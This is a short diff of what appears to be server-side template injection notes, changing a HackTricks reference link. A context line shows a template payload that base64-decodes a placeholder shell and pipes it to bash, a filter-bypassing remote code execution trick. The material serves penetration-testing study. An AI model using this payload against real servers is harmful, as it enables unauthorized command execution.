@@ -153,5 +153,5 @@ ${ex("bash -c {echo,<base64-shell>}|{base64,-d}|bash")}
 
 ## Reference
 
-HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+HackTricks SSTI: https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
 PayloadsAllTheThings SSTI: all engines and filter bypasses in one place.
